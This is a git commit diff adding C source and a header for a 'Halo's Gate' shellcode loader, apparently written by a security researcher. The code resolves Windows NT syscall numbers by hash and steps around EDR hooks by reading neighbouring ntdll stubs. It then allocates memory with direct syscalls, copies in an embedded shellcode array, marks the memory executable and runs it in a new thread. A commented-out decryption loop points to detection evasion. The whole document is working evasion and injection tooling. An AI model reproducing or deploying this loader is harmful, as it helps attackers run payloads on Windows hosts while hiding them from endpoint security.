b459a1588fa28caa73084dd2249fe28a6392ebb9
Konstantin Karabadzhakov <konstantin.karabadzhakov@nccgroup.com>
2022-08-12 10:49:59 +0100

    Halo

---
+++ C++/HalosGate/HalosGate.c
@@ -0,0 +1,250 @@
+﻿#include "structs.h"
+#include "prototypes.h"
+
+#pragma once
+#include <Windows.h>
+#include "structs.h"
+
+#include <stdio.h>
+
+#define UP -32
+#define DOWN 32
+
+
+unsigned char shellcode[] =
+"\x48\x83\xEC\x28\x48\x83\xE4\xF0\x48\x8D\x15\x66\x00\x00\x00"
+"\x48\x8D\x0D\x52\x00\x00\x00\xE8\x9E\x00\x00\x00\x4C\x8B\xF8"
+"\x48\x8D\x0D\x5D\x00\x00\x00\xFF\xD0\x48\x8D\x15\x5F\x00\x00"
+"\x00\x48\x8D\x0D\x4D\x00\x00\x00\xE8\x7F\x00\x00\x00\x4D\x33"
+"\xC9\x4C\x8D\x05\x61\x00\x00\x00\x48\x8D\x15\x4E\x00\x00\x00"
+"\x48\x33\xC9\xFF\xD0\x48\x8D\x15\x56\x00\x00\x00\x48\x8D\x0D"
+"\x0A\x00\x00\x00\xE8\x56\x00\x00\x00\x48\x33\xC9\xFF\xD0\x4B"
+"\x45\x52\x4E\x45\x4C\x33\x32\x2E\x44\x4C\x4C\x00\x4C\x6F\x61"
+"\x64\x4C\x69\x62\x72\x61\x72\x79\x41\x00\x55\x53\x45\x52\x33"
+"\x32\x2E\x44\x4C\x4C\x00\x4D\x65\x73\x73\x61\x67\x65\x42\x6F"
+"\x78\x41\x00\x48\x65\x6C\x6C\x6F\x20\x77\x6F\x72\x6C\x64\x00"
+"\x4D\x65\x73\x73\x61\x67\x65\x00\x45\x78\x69\x74\x50\x72\x6F"
+"\x63\x65\x73\x73\x00\x48\x83\xEC\x28\x65\x4C\x8B\x04\x25\x60"
+"\x00\x00\x00\x4D\x8B\x40\x18\x4D\x8D\x60\x10\x4D\x8B\x04\x24"
+"\xFC\x49\x8B\x78\x60\x48\x8B\xF1\xAC\x84\xC0\x74\x26\x8A\x27"
+"\x80\xFC\x61\x7C\x03\x80\xEC\x20\x3A\xE0\x75\x08\x48\xFF\xC7"
+"\x48\xFF\xC7\xEB\xE5\x4D\x8B\x00\x4D\x3B\xC4\x75\xD6\x48\x33"
+"\xC0\xE9\xA7\x00\x00\x00\x49\x8B\x58\x30\x44\x8B\x4B\x3C\x4C"
+"\x03\xCB\x49\x81\xC1\x88\x00\x00\x00\x45\x8B\x29\x4D\x85\xED"
+"\x75\x08\x48\x33\xC0\xE9\x85\x00\x00\x00\x4E\x8D\x04\x2B\x45"
+"\x8B\x71\x04\x4D\x03\xF5\x41\x8B\x48\x18\x45\x8B\x50\x20\x4C"
+"\x03\xD3\xFF\xC9\x4D\x8D\x0C\x8A\x41\x8B\x39\x48\x03\xFB\x48"
+"\x8B\xF2\xA6\x75\x08\x8A\x06\x84\xC0\x74\x09\xEB\xF5\xE2\xE6"
+"\x48\x33\xC0\xEB\x4E\x45\x8B\x48\x24\x4C\x03\xCB\x66\x41\x8B"
+"\x0C\x49\x45\x8B\x48\x1C\x4C\x03\xCB\x41\x8B\x04\x89\x49\x3B"
+"\xC5\x7C\x2F\x49\x3B\xC6\x73\x2A\x48\x8D\x34\x18\x48\x8D\x7C"
+"\x24\x30\x4C\x8B\xE7\xA4\x80\x3E\x2E\x75\xFA\xA4\xC7\x07\x44"
+"\x4C\x4C\x00\x49\x8B\xCC\x41\xFF\xD7\x49\x8B\xCC\x48\x8B\xD6"
+"\xE9\x14\xFF\xFF\xFF\x48\x03\xC3\x48\x83\xC4\x28\xC3";
+
+
+/*--------------------------------------------------------------------
+  External functions' prototype.
+--------------------------------------------------------------------*/
+extern VOID HellsGate(WORD wSystemCall);
+extern HellDescent();
+
+INT wmain() {
+	//int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
+
+	PTEB pCurrentTeb = RtlGetThreadEnvironmentBlock();
+	PPEB pCurrentPeb = pCurrentTeb->ProcessEnvironmentBlock;
+	if (!pCurrentPeb || !pCurrentTeb || pCurrentPeb->OSMajorVersion != 0xA)
+		return 0x1;
+
+	// Get NTDLL module 
+	PLDR_DATA_TABLE_ENTRY pLdrDataEntry = (PLDR_DATA_TABLE_ENTRY)((PBYTE)pCurrentPeb->LoaderData->InMemoryOrderModuleList.Flink->Flink - 0x10);
+
+	// Get the EAT of NTDLL
+	PIMAGE_EXPORT_DIRECTORY pImageExportDirectory = NULL;
+	if (!GetImageExportDirectory(pLdrDataEntry->DllBase, &pImageExportDirectory) || pImageExportDirectory == NULL)
+		return 0x01;
+
+	VX_TABLE Table = { 0 };
+	Table.NtAllocateVirtualMemory.dwHash = 0xf5bd373480a6b89b;
+	if (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &Table.NtAllocateVirtualMemory))
+		return 0x1;
+
+	Table.NtCreateThreadEx.dwHash = 0x64dc7db288c5015f;
+	if (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &Table.NtCreateThreadEx))
+		return 0x1;
+
+	Table.NtProtectVirtualMemory.dwHash = 0x858bcb1046fb6a37;
+	if (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &Table.NtProtectVirtualMemory))
+		return 0x1;
+
+	Table.NtWaitForSingleObject.dwHash = 0xc6a2fa174e551bcb;
+	if (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &Table.NtWaitForSingleObject))
+		return 0x1;
+
+	EnterHell(&Table);
+	return 0x00;
+}
+
+PTEB RtlGetThreadEnvironmentBlock() {
+#if _WIN64
+	return (PTEB)__readgsqword(0x30);
+#else
+	return (PTEB)__readfsdword(0x16);
+#endif
+}
+
+DWORD64 djb2(PBYTE str) {
+	DWORD64 dwHash = 0x7734773477347734;
+	INT c;
+
+	while (c = *str++)
+		dwHash = ((dwHash << 0x5) + dwHash) + c;
+
+	return dwHash;
+}
+
+BOOL GetImageExportDirectory(PVOID pModuleBase, PIMAGE_EXPORT_DIRECTORY* ppImageExportDirectory) {
+	// Get DOS header
+	PIMAGE_DOS_HEADER pImageDosHeader = (PIMAGE_DOS_HEADER)pModuleBase;
+	if (pImageDosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
+		return FALSE;
+	}
+
+	// Get NT headers
+	PIMAGE_NT_HEADERS pImageNtHeaders = (PIMAGE_NT_HEADERS)((PBYTE)pModuleBase + pImageDosHeader->e_lfanew);
+	if (pImageNtHeaders->Signature != IMAGE_NT_SIGNATURE) {
+		return FALSE;
+	}
+
+	// Get the EAT
+	*ppImageExportDirectory = (PIMAGE_EXPORT_DIRECTORY)((PBYTE)pModuleBase + pImageNtHeaders->OptionalHeader.DataDirectory[0].VirtualAddress);
+	return TRUE;
+}
+
+BOOL GetVxTableEntry(PVOID pModuleBase, PIMAGE_EXPORT_DIRECTORY pImageExportDirectory, PVX_TABLE_ENTRY pVxTableEntry) {
+	PDWORD pdwAddressOfFunctions = (PDWORD)((PBYTE)pModuleBase + pImageExportDirectory->AddressOfFunctions);
+	PDWORD pdwAddressOfNames = (PDWORD)((PBYTE)pModuleBase + pImageExportDirectory->AddressOfNames);
+	PWORD pwAddressOfNameOrdinales = (PWORD)((PBYTE)pModuleBase + pImageExportDirectory->AddressOfNameOrdinals);
+
+	for (WORD cx = 0; cx < pImageExportDirectory->NumberOfNames; cx++) {
+		PCHAR pczFunctionName = (PCHAR)((PBYTE)pModuleBase + pdwAddressOfNames[cx]);
+		PVOID pFunctionAddress = (PBYTE)pModuleBase + pdwAddressOfFunctions[pwAddressOfNameOrdinales[cx]];
+
+		if (djb2(pczFunctionName) == pVxTableEntry->dwHash) {
+			pVxTableEntry->pAddress = pFunctionAddress;
+
+			// First opcodes should be :
+			//    MOV R10, RCX
+			//    MOV RAX, <syscall>
+			if (*((PBYTE)pFunctionAddress) == 0x4c
+				&& *((PBYTE)pFunctionAddress + 1) == 0x8b
+				&& *((PBYTE)pFunctionAddress + 2) == 0xd1
+				&& *((PBYTE)pFunctionAddress + 3) == 0xb8
+				&& *((PBYTE)pFunctionAddress + 6) == 0x00
+				&& *((PBYTE)pFunctionAddress + 7) == 0x00) {
+
+				BYTE high = *((PBYTE)pFunctionAddress + 5);
+				BYTE low = *((PBYTE)pFunctionAddress + 4);
+				pVxTableEntry->wSystemCall = (high << 8) | low;
+
+				return TRUE;
+			}
+
+			// if hooked check the neighborhood to find clean syscall
+			if (*((PBYTE)pFunctionAddress) == 0xe9) {
+
+				for (WORD idx = 1; idx <= 500; idx++) {
+					// check neighboring syscall down
+					if (*((PBYTE)pFunctionAddress + idx * DOWN) == 0x4c
+						&& *((PBYTE)pFunctionAddress + 1 + idx * DOWN) == 0x8b
+						&& *((PBYTE)pFunctionAddress + 2 + idx * DOWN) == 0xd1
+						&& *((PBYTE)pFunctionAddress + 3 + idx * DOWN) == 0xb8
+						&& *((PBYTE)pFunctionAddress + 6 + idx * DOWN) == 0x00
+						&& *((PBYTE)pFunctionAddress + 7 + idx * DOWN) == 0x00) {
+						BYTE high = *((PBYTE)pFunctionAddress + 5 + idx * DOWN);
+						BYTE low = *((PBYTE)pFunctionAddress + 4 + idx * DOWN);
+						pVxTableEntry->wSystemCall = (high << 8) | low - idx;
+
+						return TRUE;
+					}
+					// check neighboring syscall up
+					if (*((PBYTE)pFunctionAddress + idx * UP) == 0x4c
+						&& *((PBYTE)pFunctionAddress + 1 + idx * UP) == 0x8b
+						&& *((PBYTE)pFunctionAddress + 2 + idx * UP) == 0xd1
+						&& *((PBYTE)pFunctionAddress + 3 + idx * UP) == 0xb8
+						&& *((PBYTE)pFunctionAddress + 6 + idx * UP) == 0x00
+						&& *((PBYTE)pFunctionAddress + 7 + idx * UP) == 0x00) {
+						BYTE high = *((PBYTE)pFunctionAddress + 5 + idx * UP);
+						BYTE low = *((PBYTE)pFunctionAddress + 4 + idx * UP);
+						pVxTableEntry->wSystemCall = (high << 8) | low + idx;
+
+						return TRUE;
+					}
+
+				}
+
+				return FALSE;
+			}
+		}
+	}
+
+	return TRUE;
+}
+
+BOOL EnterHell(PVX_TABLE pVxTable) {
+	NTSTATUS status = 0x00000000;
+
+	//printf("vx_tab: %p | HellsGate: %p | HellDescent: %p\n", pVxTable, HellsGate, HellDescent); //getchar();
+
+	// Allocate memory for the shellcode
+	PVOID lpAddress = NULL;
+	SIZE_T sDataSize = sizeof(shellcode);
+	HellsGate(pVxTable->NtAllocateVirtualMemory.wSystemCall);
+	status = HellDescent((HANDLE)-1, &lpAddress, 0, &sDataSize, MEM_COMMIT, PAGE_READWRITE);
+
+	//printf("sc: %p | sc_mem: %p\n", shellcode, lpAddress);
+
+	//Ceasar decrypt
+	//for (int i = 0; i < sizeof(shellcode); i++) {
+		// with sleep should result in ~25 seconds
+		//Sleep(50);
+	//	shellcode[i] = (unsigned char)(((unsigned int)shellcode[i] - 53) & 0xFF);
+	//}
+
+	// Write Memory
+	VxMoveMemory(lpAddress, shellcode, sizeof(shellcode));
+
+	// Change page permissions
+	ULONG ulOldProtect = 0;
+	HellsGate(pVxTable->NtProtectVirtualMemory.wSystemCall);
+	status = HellDescent((HANDLE)-1, &lpAddress, &sDataSize, PAGE_EXECUTE_READ, &ulOldProtect);
+
+	// Create thread
+	HANDLE hHostThread = INVALID_HANDLE_VALUE;
+	HellsGate(pVxTable->NtCreateThreadEx.wSystemCall);
+	status = HellDescent(&hHostThread, 0x1FFFFF, NULL, (HANDLE)-1, (LPTHREAD_START_ROUTINE)lpAddress, NULL, FALSE, NULL, NULL, NULL, NULL);
+
+	// Wait for 1 seconds
+	LARGE_INTEGER Timeout;
+	Timeout.QuadPart = -10000000000000;
+	HellsGate(pVxTable->NtWaitForSingleObject.wSystemCall);
+	status = HellDescent(hHostThread, FALSE, &Timeout);
+
+	return TRUE;
+}
+
+PVOID VxMoveMemory(PVOID dest, const PVOID src, SIZE_T len) {
+	char* d = dest;
+	const char* s = src;
+	if (d < s)
+		while (len--)
+			*d++ = *s++;
+	else {
+		char* lasts = s + (len - 1);
+		char* lastd = d + (len - 1);
+		while (len--)
+			*lastd-- = *lasts--;
+	}
+	return dest;
+}
---
+++ C++/HalosGate/prototypes.h
@@ -0,0 +1,41 @@
+#pragma once
+#include <windows.h>
+#include "structs.h"
+
+/*--------------------------------------------------------------------
+  VX Tables
+--------------------------------------------------------------------*/
+typedef struct _VX_TABLE_ENTRY {
+	PVOID   pAddress;
+	DWORD64 dwHash;
+	WORD    wSystemCall;
+} VX_TABLE_ENTRY, * PVX_TABLE_ENTRY;
+
+typedef struct _VX_TABLE {
+	VX_TABLE_ENTRY NtAllocateVirtualMemory;
+	VX_TABLE_ENTRY NtProtectVirtualMemory;
+	VX_TABLE_ENTRY NtCreateThreadEx;
+	VX_TABLE_ENTRY NtWaitForSingleObject;
+} VX_TABLE, * PVX_TABLE;
+
+/*--------------------------------------------------------------------
+  Function prototypes.
+--------------------------------------------------------------------*/
+PTEB RtlGetThreadEnvironmentBlock();
+BOOL GetImageExportDirectory(
+	_In_ PVOID                     pModuleBase,
+	_Out_ PIMAGE_EXPORT_DIRECTORY* ppImageExportDirectory
+);
+BOOL GetVxTableEntry(
+	_In_ PVOID pModuleBase,
+	_In_ PIMAGE_EXPORT_DIRECTORY pImageExportDirectory,
+	_In_ PVX_TABLE_ENTRY pVxTableEntry
+);
+BOOL Payload(
+	_In_ PVX_TABLE pVxTable
+);
+PVOID VxMoveMemory(
+	_Inout_ PVOID dest,
+	_In_    const PVOID src,
+	_In_    SIZE_T len
+);
